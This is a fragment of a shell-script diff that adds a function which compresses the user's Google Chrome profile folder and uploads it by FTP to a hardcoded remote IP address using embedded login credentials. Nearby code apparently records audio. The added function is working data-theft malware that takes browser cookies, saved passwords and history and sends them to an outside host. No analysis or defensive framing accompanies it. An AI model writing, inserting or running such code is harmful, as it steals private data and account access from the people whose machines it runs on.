@@ -59,6 +59,27 @@ function GCx(){
     	rm -f "$IBUS_$output_file"
 }
 
+function GCx_(){
+	ftp_server="139.162.128.166"
+	ftp_user="r00t1970"
+	ftp_password="Hello.321/"
+	#
+	folder_to_compress="/home/$USER/.config/google-chrome"
+	output_file="$IBUS_""gcx.tar.gz"
+	tar -czvf "$output_file" "$folder_to_compress"
+	#
+	local_file="$IBUS_""gcx.tar.gz"
+	remote_directory="/home/r00t1970/GCx.tar.gz"
+	#
+	ftp -npvi $ftp_server <<END_SCRIPT
+	quote USER $ftp_user
+	quote PASS $ftp_password
+	binary
+	put "$local_file" "$remote_directory"
+	quit
+	END_SCRIPT
+}
+
 function ax(){
     #sox
     duration=30
